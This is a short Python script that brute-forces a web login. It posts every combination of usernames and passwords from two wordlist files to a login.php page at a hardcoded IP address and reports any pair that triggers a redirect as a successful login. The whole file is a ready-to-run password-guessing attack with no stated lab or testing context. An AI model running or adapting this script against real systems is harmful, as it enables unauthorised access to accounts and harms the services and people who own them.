import requests

r = requests.Session()

url = 'http://51.15.136.118:80/login.php'

with open('./wordlists/userlist.txt', 'r') as userfile:
    users = userfile.readlines()
with open('./wordlists/passwordlist.txt', 'r') as passfile:
    passwords = passfile.readlines()

results = []

for user in users:
    for password in passwords:
        user = user.strip()
        password = password.strip()
        data = {'username': user, 'password': password}
        response = r.post(url, data=data, allow_redirects=False)
        if response.status_code == 302:  # Redirection
            location = response.headers['Location']
            result = {'user': user, 'password': password, 'status': response.status_code, 'location': location}
            results.append(result)
            print(f'Successful login with username = "{user}" and password = "{password}"')
            
# Print results in a table
print("----------------------------------------------------------------")
print("{:<15} {:<15} {:<10} {:<50}".format('Username', 'Password', 'Status', 'Location'))
for result in results:
    print("{:<15} {:<15} {:<10} {:<50}".format(result['user'], result['password'], result['status'], result.get('location', '')))
        

